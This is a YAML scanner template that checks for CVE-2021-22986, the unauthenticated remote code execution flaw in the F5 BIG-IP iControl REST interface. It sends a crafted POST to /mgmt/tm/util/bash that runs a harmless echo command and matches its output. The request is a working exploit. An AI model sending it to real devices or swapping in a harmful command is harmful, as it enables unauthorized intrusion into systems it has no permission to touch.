name: F5_BIG_IP_RCE_CVE_2021_22986_exp
transport: http
set: {}
detail:
  dock: product="F5-BIGIP"
  product: F5 Big-IP
  homepage: ''
  impact: '<p><span style="font-size: 15px;">F5 BIG-IP/BIG-IQ iControl REST 未授权远程代码执行漏洞中，未经身份验证的攻击者可通过iControl
    REST接口，构造恶意请求，执行任意系统命令。</span><br></p>'
  description: F5 BIG-IP/BIG-IQ iControl REST 未授权远程代码执行漏洞中，未经身份验证的攻击者可通过iControl REST接口，构造恶意请求，执行任意系统命令。
rules:
  r1:
    method: POST
    path: /mgmt/tm/util/bash
    follow_redirects: true
    headers:
      Authorization: Basic YWRtaW46QVNhc1M=
      X-F5-Auth-Token: ''
    body: '{"command":"run","utilCmdArgs":"-c ''echo tsxts|base64''"}'
    expression: response.status == 200 && response.body.bcontains(b'dHN4dHMK')
expression: r1()
